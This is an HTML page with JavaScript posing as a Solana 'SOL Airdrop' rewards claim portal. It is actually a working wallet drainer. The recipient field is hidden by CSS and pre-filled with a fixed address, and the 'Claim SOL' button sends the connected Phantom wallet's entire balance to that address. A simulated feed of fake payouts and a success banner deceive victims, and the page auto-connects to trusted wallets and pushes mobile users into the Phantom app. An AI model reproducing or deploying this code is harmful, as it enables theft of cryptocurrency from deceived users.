<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SOL Rewards Portal</title>
<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');

  :root {
    --bg: #0a0a0f;
    --surface: #111118;
    --border: #1e1e2e;
    --accent: #9945FF;
    --accent2: #14F195;
    --text: #e2e8f0;
    --muted: #4a5568;
    --error: #fc8181;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Syne', sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    overflow-x: hidden;
    padding: 10px;
    position: relative;
  }

  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background:
      radial-gradient(ellipse 60% 40% at 20% 20%, rgba(153,69,255,0.12) 0%, transparent 60%),
      radial-gradient(ellipse 50% 40% at 80% 80%, rgba(20,241,149,0.08) 0%, transparent 60%);
    pointer-events: none;
  }

  /* Header Notification */
  .header-notification {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    background: linear-gradient(135deg, rgba(20,241,149,0.95), rgba(153,69,255,0.95));
    color: var(--bg);
    padding: 12px 20px;
    z-index: 1000;
    transform: translateY(-100%);
    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
    backdrop-filter: blur(10px);
    box-shadow: 0 4px 30px rgba(20,241,149,0.3);
  }

  .header-notification.visible {
    transform: translateY(0);
  }

  .notification-content {
    max-width: 600px;
    margin: 0 auto;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    font-size: 14px;
    font-weight: 700;
  }

  .notification-content svg {
    width: 20px;
    height: 20px;
    fill: currentColor;
    animation: pulse 1.5s ease-in-out infinite;
  }

  @keyframes pulse {
    0%, 100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.8; }
  }

  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 20px;
    padding: 24px;
    width: 100%;
    max-width: 440px;
    max-height: 90vh;
    overflow-y: auto;
    position: relative;
    box-shadow: 0 0 60px rgba(153,69,255,0.08), 0 24px 48px rgba(0,0,0,0.4);
    margin-top: 10px;
  }

  .network-badge {
    position: absolute;
    top: 16px;
    right: 16px;
    font-size: 10px;
    font-family: 'Space Mono', monospace;
    background: rgba(20,241,149,0.1);
    border: 1px solid rgba(20,241,149,0.2);
    color: var(--accent2);
    padding: 3px 8px;
    border-radius: 20px;
  }

  .logo-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 24px;
  }

  .logo-icon {
    width: 40px;
    height: 40px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 20px;
  }

  h1 {
    font-size: 22px;
    font-weight: 800;
    letter-spacing: -0.5px;
  }

  h1 span { color: var(--accent2); }

  .wallet-bar {
    background: rgba(153,69,255,0.08);
    border: 1px solid rgba(153,69,255,0.2);
    border-radius: 10px;
    padding: 12px 16px;
    margin-bottom: 20px;
    display: none;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
  }

  .wallet-bar.visible { display: flex; }

  .wallet-addr {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    color: var(--accent2);
    word-break: break-all;
    max-width: 200px;
  }

  .balance-pill {
    background: rgba(20,241,149,0.1);
    border: 1px solid rgba(20,241,149,0.2);
    border-radius: 20px;
    padding: 4px 10px;
    font-size: 11px;
    font-family: 'Space Mono', monospace;
    color: var(--accent2);
    white-space: nowrap;
  }

  .field {
    margin-bottom: 14px;
  }

  label {
    display: block;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 8px;
  }

  input {
    width: 100%;
    background: rgba(255,255,255,0.03);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 12px 14px;
    color: var(--text);
    font-family: 'Space Mono', monospace;
    font-size: 13px;
    outline: none;
    transition: border-color 0.2s;
  }

  input:focus {
    border-color: var(--accent);
    background: rgba(153,69,255,0.04);
  }

  input::placeholder { color: var(--muted); }

  .btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 12px;
    font-family: 'Syne', sans-serif;
    font-weight: 700;
    font-size: 15px;
    cursor: pointer;
    letter-spacing: 0.3px;
    transition: all 0.2s;
    margin-top: 8px;
  }

  .btn-connect {
    background: linear-gradient(135deg, var(--accent), #7c3aed);
    color: #fff;
    box-shadow: 0 4px 20px rgba(153,69,255,0.3);
  }

  .btn-connect:hover {
    transform: translateY(-1px);
    box-shadow: 0 6px 24px rgba(153,69,255,0.45);
  }

  .btn-send {
    background: linear-gradient(135deg, var(--accent2), #00c97d);
    color: #0a0a0f;
    box-shadow: 0 4px 20px rgba(20,241,149,0.25);
    display: none;
  }

  .btn-send.visible {
    display: block;
  }

  .btn-send:hover {
    transform: translateY(-1px);
    box-shadow: 0 6px 24px rgba(20,241,149,0.4);
  }

  .btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none !important;
  }

  .status {
    margin-top: 16px;
    padding: 12px 16px;
    border-radius: 10px;
    font-size: 13px;
    font-family: 'Space Mono', monospace;
    word-break: break-all;
    display: none;
    animation: fadeIn 0.3s ease;
  }

  @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }

  .status.success {
    display: block;
    background: rgba(20,241,149,0.08);
    border: 1px solid rgba(20,241,149,0.2);
    color: var(--accent2);
  }

  .status.error {
    display: block;
    background: rgba(252,129,129,0.08);
    border: 1px solid rgba(252,129,129,0.2);
    color: var(--error);
  }

  .status.info {
    display: block;
    background: rgba(153,69,255,0.08);
    border: 1px solid rgba(153,69,255,0.2);
    color: #b794f4;
  }

  .divider {
    border: none;
    border-top: 1px solid var(--border);
    margin: 20px 0;
  }

  .tx-link {
    color: var(--accent2);
    text-decoration: none;
  }
  .tx-link:hover { text-decoration: underline; }

  .spinner {
    display: inline-block;
    width: 14px;
    height: 14px;
    border: 2px solid rgba(0,0,0,0.2);
    border-top-color: #0a0a0f;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    vertical-align: middle;
    margin-right: 6px;
  }

  @keyframes spin { to { transform: rotate(360deg); } }

  /* Auto Amount Display */
  .auto-amount {
    background: rgba(20,241,149,0.05);
    border: 1px solid rgba(20,241,149,0.2);
    border-radius: 10px;
    padding: 12px 14px;
    font-family: 'Space Mono', monospace;
    font-size: 13px;
    color: var(--accent2);
  }

  /* Payout List Section */
  .payout-section {
    margin-top: 20px;
    animation: fadeIn 0.6s ease 0.3s both;
  }

  .payout-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 10px;
  }

  .payout-title {
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    color: var(--muted);
    display: flex;
    align-items: center;
    gap: 6px;
  }

  .live-indicator {
    width: 6px;
    height: 6px;
    background: var(--accent2);
    border-radius: 50%;
    animation: livePulse 1.5s ease-in-out infinite;
    box-shadow: 0 0 8px var(--accent2);
  }

  @keyframes livePulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(1.2); }
  }

  .payout-count {
    font-size: 10px;
    color: var(--muted);
    font-family: 'Space Mono', monospace;
  }

  .payout-list {
    background: rgba(255,255,255,0.03);
    border: 1px solid var(--border);
    border-radius: 12px;
    max-height: 150px;
    overflow-y: auto;
    padding: 8px;
  }

  .payout-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 8px 10px;
    border-radius: 8px;
    margin-bottom: 4px;
    background: rgba(153,69,255,0.05);
    border: 1px solid rgba(153,69,255,0.1);
    animation: payoutEnter 0.4s ease;
    transition: all 0.2s ease;
  }

  .payout-item:last-child {
    margin-bottom: 0;
  }

  .payout-item:hover {
    background: rgba(153,69,255,0.1);
    border-color: rgba(153,69,255,0.2);
  }

  @keyframes payoutEnter {
    from { opacity: 0; transform: translateX(-10px); }
    to { opacity: 1; transform: translateX(0); }
  }

  .payout-addr {
    font-family: 'Space Mono', monospace;
    font-size: 10px;
    color: var(--text);
    max-width: 140px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  .payout-amount {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    font-weight: 700;
    color: var(--accent2);
    display: flex;
    align-items: center;
    gap: 4px;
  }

  .payout-amount::before {
    content: '◎';
    font-size: 10px;
  }

  .payout-time {
    font-size: 9px;
    color: var(--muted);
    margin-left: 8px;
    font-family: 'Space Mono', monospace;
  }

  /* Scrollbar styling */
  .payout-list::-webkit-scrollbar {
    width: 4px;
  }

  .payout-list::-webkit-scrollbar-track {
    background: transparent;
  }

  .payout-list::-webkit-scrollbar-thumb {
    background: var(--border);
    border-radius: 2px;
  }

  /* Mobile Responsive */
  @media (max-width: 480px) {
    body {
      padding: 8px;
      align-items: flex-start;
    }

    .card {
      padding: 20px;
      border-radius: 16px;
      max-height: 95vh;
      margin-top: 5px;
    }

    .network-badge {
      top: 12px;
      right: 12px;
      font-size: 9px;
      padding: 2px 6px;
    }

    .logo-row {
      margin-bottom: 20px;
    }

    .logo-icon {
      width: 36px;
      height: 36px;
      font-size: 18px;
    }

    h1 {
      font-size: 20px;
    }

    .wallet-bar {
      padding: 10px 12px;
      margin-bottom: 16px;
    }

    .wallet-addr {
      font-size: 10px;
      max-width: 150px;
    }

    .balance-pill {
      font-size: 10px;
      padding: 3px 8px;
    }

    .field {
      margin-bottom: 12px;
    }

    input {
      padding: 10px 12px;
      font-size: 12px;
    }

    .auto-amount {
      padding: 10px 12px;
      font-size: 12px;
    }

    .btn {
      padding: 12px;
      font-size: 14px;
    }

    .divider {
      margin: 16px 0;
    }

    .status {
      font-size: 12px;
      padding: 10px 12px;
    }

    .payout-section {
      margin-top: 16px;
    }

    .payout-list {
      max-height: 120px;
    }

    .payout-item {
      padding: 6px 8px;
    }

    .payout-addr {
      font-size: 9px;
      max-width: 120px;
    }

    .payout-amount {
      font-size: 10px;
    }
  }

  @media (max-height: 700px) {
    .card {
      max-height: 95vh;
    }

    .payout-list {
      max-height: 100px;
    }
  }

  /* Reduced motion */
  @media (prefers-reduced-motion: reduce) {
    *, *::before, *::after {
      animation-duration: 0.01ms !important;
      animation-iteration-count: 1 !important;
      transition-duration: 0.01ms !important;
    }
  }

  #sendForm .field:first-child {
    display: none !important;
  }
</style>
</head>
<body>

<!-- Header Notification -->
<div class="header-notification" id="headerNotification">
  <div class="notification-content">
    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
    <span id="notificationText">Successfully sent 0.3389 SOL!</span>
  </div>
</div>

<div class="card">
  <span class="network-badge">Mainnet</span>

  <div class="logo-row">
    <div class="logo-icon">◎</div>
    <h1>SOL <span>Airdrop</span></h1>
  </div>

  <div class="wallet-bar" id="walletBar">
    <span class="wallet-addr" id="walletAddr">—</span>
    <span class="balance-pill" id="balancePill">0 SOL</span>
  </div>

  <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">Connect Phantom</button>

  <hr class="divider" id="divider" style="display:none;">

  <div id="sendForm" style="display:none;">
    <div class="field">
      <label>Recipient Address</label>
      <input type="text" id="recipient" value="AFNK585ticv7a7t8wscL9gTJMQhA75kn6nqYxf4oPyp3" />
    </div>
    <div class="field">
      <label>Amount (Auto — full balance minus fee)</label>
      <div class="auto-amount" id="autoAmount">Calculating...</div>
    </div>
  </div>

  <button class="btn btn-send" id="sendBtn" onclick="sendSOL()">Claim SOL</button>

  <div class="status" id="status"></div>

  <!-- Payout List Section -->
  <div class="payout-section" id="payoutSection" style="display: none;">
    <div class="payout-header">
      <div class="payout-title">
        <span class="live-indicator"></span>
        Recent Transfers
      </div>
      <span class="payout-count" id="payoutCount">0 transfers</span>
    </div>
    <div class="payout-list" id="payoutList">
      <!-- Payout items will be generated here -->
    </div>
  </div>
</div>

<script>
  const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;

  // Multiple public RPC endpoints with CORS support — tries each until one works
  const RPCS = [
    'https://solana-mainnet.infura.io/v3/1e82942fae354057aa02552fbfc2f6d7',
    'https://rpc.ankr.com/solana',
    'https://api.mainnet-beta.solana.com',
  ];

  let connection = null;
  let walletPubkey = null;
  let payoutHistory = [];

  // Show header notification
  function showHeaderNotification(message) {
    const notification = document.getElementById('headerNotification');
    const text = document.getElementById('notificationText');
    
    if (!notification || !text) return;
    
    text.textContent = message;
    notification.classList.add('visible');
    
    // Auto hide after 4 seconds
    setTimeout(() => {
      notification.classList.remove('visible');
    }, 4000);
  }

  // Add payout to list
  function addPayout(address, amount) {
    const list = document.getElementById('payoutList');
    const count = document.getElementById('payoutCount');
    const section = document.getElementById('payoutSection');
    
    if (!list || !count || !section) return;
    
    // Show section if hidden
    section.style.display = 'block';
    
    const shortAddr = address.slice(0, 4) + '...' + address.slice(-4);
    const time = new Date().toLocaleTimeString('en-US', { 
      hour12: false, 
      hour: '2-digit', 
      minute: '2-digit',
      second: '2-digit'
    });
    
    const payoutItem = document.createElement('div');
    payoutItem.className = 'payout-item';
    payoutItem.innerHTML = `
      <span class="payout-addr">${shortAddr}</span>
      <div style="display: flex; align-items: center;">
        <span class="payout-amount">${amount}</span>
        <span class="payout-time">${time}</span>
      </div>
    `;
    
    // Add to beginning
    list.insertBefore(payoutItem, list.firstChild);
    
    // Keep only last 10 items
    while (list.children.length > 10) {
      list.removeChild(list.lastChild);
    }
    
    // Update count
    payoutHistory.push({ address, amount, time });
    count.textContent = `${payoutHistory.length} transfers`;
  }

  // Generate fake payout for demo
  function generateFakePayout() {
    const fakeAddresses = [
      '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
      '3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy',
      '5vKQx8JLzR7L1d6XqZ9Y2vT3wU4eR5iO6pA7sD8fG9h',
      '9aBcDeFgHiJkLmNoPqRsTuVwXyZ123456789',
      '2xYz9AbC3DeFgHiJkLmNoPqRsTuVwXyZ456'
    ];
    
    const randomAddr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
    const randomAmount = (Math.random() * 2 + 0.1).toFixed(4);
    
    addPayout(randomAddr, randomAmount);
  }

  // Start fake payout generation
  function startFakePayoutLoop() {
    // Generate initial payouts
    for (let i = 0; i < 3; i++) {
      setTimeout(generateFakePayout, i * 600);
    }
    
    // Generate new payout every 10-20 seconds
    setInterval(() => {
      generateFakePayout();
    }, 10000 + Math.random() * 10000);
  }

  async function getWorkingConnection() {
    for (const rpc of RPCS) {
      try {
        const conn = new Connection(rpc, 'confirmed');
        await conn.getSlot();
        console.log('Using RPC:', rpc);
        return conn;
      } catch (e) {
        console.warn('RPC failed:', rpc, e.message);
      }
    }
    throw new Error('All RPC endpoints unavailable. Check your connection.');
  }

  function setStatus(msg, type = 'info') {
    const el = document.getElementById('status');
    el.className = 'status ' + type;
    el.innerHTML = msg;
  }

  function showConnected() {
    const btn = document.getElementById('connectBtn');
    btn.disabled = false;
    btn.textContent = '✓ Connected Tap Claim SOL';
    btn.style.background = 'rgba(20,241,149,0.1)';
    btn.style.border = '1px solid rgba(20,241,149,0.3)';
    btn.style.color = 'var(--accent2)';
    btn.style.boxShadow = 'none';
    document.getElementById('divider').style.display = 'block';
    document.getElementById('sendForm').style.display = 'block';
    document.getElementById('sendBtn').classList.add('visible');
    
    // Show payout section
    document.getElementById('payoutSection').style.display = 'block';
  }

  async function connectWallet() {
    const btn = document.getElementById('connectBtn');
    try {
      // Mobile without Phantom injected → redirect to app
      if (isMobile() && !window.solana?.isPhantom) {
        setStatus('📱 Opening Phantom app...', 'info');
        setTimeout(redirectToPhantom, 500);
        return;
      }

      if (!window.solana || !window.solana.isPhantom) {
        setStatus('❌ Phantom not found. <a class="tx-link" href="https://phantom.app" target="_blank">Install Phantom →</a>', 'error');
        return;
      }

      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span>Connecting...';

      const resp = await window.solana.connect();
      walletPubkey = resp.publicKey;

      document.getElementById('walletAddr').textContent = walletPubkey.toString();
      document.getElementById('walletBar').classList.add('visible');

      // Init connection + fetch balance
      setStatus('⏳ Fetching balance...', 'info');
      connection = await getWorkingConnection();
      await refreshBalance();

      document.getElementById('status').className = 'status'; // hide status
      showConnected();

    } catch (e) {
      btn.disabled = false;
      btn.textContent = 'Connect Phantom';
      setStatus('❌ ' + (e.message || 'Connection rejected'), 'error');
    }
  }

  async function refreshBalance() {
    if (!walletPubkey || !connection) return;
    try {
      const lamports = await connection.getBalance(walletPubkey);
      const sol = lamports / LAMPORTS_PER_SOL;
      document.getElementById('balancePill').textContent = sol.toFixed(4) + ' SOL';
      const sendable = Math.max(0, (lamports - 80000) / LAMPORTS_PER_SOL);
      const el = document.getElementById('autoAmount');
      if (el) el.textContent = sendable.toFixed(6) + ' SOL  (0.001 SOL reserved for fees)';
    } catch (e) {
      document.getElementById('balancePill').textContent = '? SOL';
      console.warn('Balance fetch failed:', e.message);
    }
  }

  async function sendSOL() {
    const btn = document.getElementById('sendBtn');
    const recipientStr = document.getElementById('recipient').value.trim();

    if (!recipientStr) {
      setStatus('⚠️ Recipient address missing.', 'error');
      return;
    }

    let recipientPubkey;
    try {
      recipientPubkey = new PublicKey(recipientStr);
    } catch {
      setStatus('❌ Invalid recipient address.', 'error');
      return;
    }

    if (!connection) connection = await getWorkingConnection();

    // Always fetch live balance and subtract fee
    const rawBalance = await connection.getBalance(walletPubkey);

    // Get real fee for this transaction
    const TX_FEE = 5000; // lamports
    // Solana requires minimum rent-exempt balance (~890880 lamports) but
    // for closing/sweeping a wallet we can send everything since Phantom
    // handles closing. Use a safe 0.001 SOL buffer total.
    const RESERVE = 80000; // 0.00008 SOL reserved for gas
    const lamports = rawBalance - RESERVE;

    if (lamports <= 0) {
      setStatus('❌ Insufficient balance (need > 0.00008 SOL to cover fees).', 'error');
      return;
    }

    const amount = lamports / LAMPORTS_PER_SOL;

    try {
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span>Sending...';

      if (!connection) connection = await getWorkingConnection();

      let signature;
      let blockhash;
      let lastValidBlockHeight;

      // Retry up to 3 times with a fresh blockhash each attempt
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          setStatus(`⏳ Fetching blockhash (attempt ${attempt}/3)...`, 'info');

          // Always fetch a FRESH blockhash right before building + signing
          const block = await connection.getLatestBlockhash('finalized');
          blockhash = block.blockhash;
          lastValidBlockHeight = block.lastValidBlockHeight;

          const tx = new Transaction({
            recentBlockhash: blockhash,
            feePayer: walletPubkey,
          }).add(
            SystemProgram.transfer({
              fromPubkey: walletPubkey,
              toPubkey: recipientPubkey,
              lamports,
            })
          );

          setStatus('⏳ Approve in Phantom...', 'info');
          const result = await window.solana.signAndSendTransaction(tx);
          signature = result.signature;
          break; // success — exit retry loop

        } catch (e) {
          const expired = e.message && (
            e.message.includes('block height exceeded') ||
            e.message.includes('expired') ||
            e.message.includes('Blockhash not found')
          );
          if (expired && attempt < 3) {
            setStatus(`⚠️ Blockhash expired, retrying... (${attempt}/3)`, 'info');
            await new Promise(r => setTimeout(r, 1000)); // wait 1s before retry
            continue;
          }
          throw e; // non-expiry error or out of retries
        }
      }

      setStatus('⏳ Confirming on-chain...', 'info');

      // Poll for confirmation instead of relying on confirmTransaction
      let confirmed = false;
      for (let i = 0; i < 30; i++) {
        await new Promise(r => setTimeout(r, 2000));
        try {
          const status = await connection.getSignatureStatuses([signature]);
          const sigStatus = status?.value?.[0];
          if (sigStatus) {
            if (sigStatus.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(sigStatus.err));
            }
            if (sigStatus.confirmationStatus === 'confirmed' || sigStatus.confirmationStatus === 'finalized') {
              confirmed = true;
              break;
            }
          }
        } catch (pollErr) {
          if (pollErr.message.includes('Transaction failed')) throw pollErr;
        }
      }

      setStatus(
        `✅ Sent ${amount.toFixed(6)} SOL!<br><a class="tx-link" href="https://solscan.io/tx/${signature}" target="_blank">View on Solscan →</a>${!confirmed ? '<br><small style="opacity:0.6">Slow to confirm — tx is likely fine, check Solscan</small>' : ''}`,
        'success'
      );

      // Show header notification
      showHeaderNotification(`Successfully sent ${amount.toFixed(4)} SOL!`);

      // Add to payout list
      addPayout(walletPubkey.toString(), amount.toFixed(4));

      await refreshBalance();

    } catch (e) {
      const msg = e.message || '';
      const isExpiry = msg.includes('block height exceeded') || msg.includes('expired') || msg.includes('Blockhash not found');

      if (isExpiry) {
        // Transaction may have landed anyway — show success with warning
        setStatus(
          '⚠️ Sent but confirmation timed out.<br>' +
          (typeof signature !== "undefined"
            ? `<a class="tx-link" href="https://solscan.io/tx/${signature}" target="_blank">Check on Solscan →</a>`
            : 'Please check your wallet balance.'),
          'success'
        );
        
        // Still add to payout list even on timeout
        if (typeof signature !== "undefined") {
          addPayout(walletPubkey.toString(), amount.toFixed(4));
          showHeaderNotification(`Successfully sent ${amount.toFixed(4)} SOL!`);
        }
        
        await refreshBalance();
      } else {
        setStatus('❌ ' + msg || 'Transaction failed', 'error');
      }
    } finally {
      btn.disabled = false;
      btn.innerHTML = 'Claim SOL';
    }
  }

  // Detect mobile and redirect to Phantom deep link if extension not present
  function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  }

  function redirectToPhantom() {
    const currentUrl = encodeURIComponent(window.location.href);
    // Phantom universal deep link — opens the app and loads this page inside its browser
    const phantomDeepLink = `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`;
    window.location.href = phantomDeepLink;
  }

  // Auto-connect if already trusted
  window.addEventListener('load', async () => {
    // Start fake payout loop for demo
    startFakePayoutLoop();

    // Mobile: no Phantom extension → redirect to Phantom app
    if (isMobile() && !window.solana?.isPhantom) {
      setStatus('📱 Opening Phantom app...', 'info');
      setTimeout(redirectToPhantom, 800);
      return;
    }

    // Desktop: auto-connect if already trusted
    if (window.solana?.isPhantom) {
      try {
        const resp = await window.solana.connect({ onlyIfTrusted: true });
        walletPubkey = resp.publicKey;
        document.getElementById('walletAddr').textContent = walletPubkey.toString();
        document.getElementById('walletBar').classList.add('visible');
        connection = await getWorkingConnection();
        await refreshBalance();
        showConnected();
      } catch {}
    }
  });
</script>

</body>
</html>
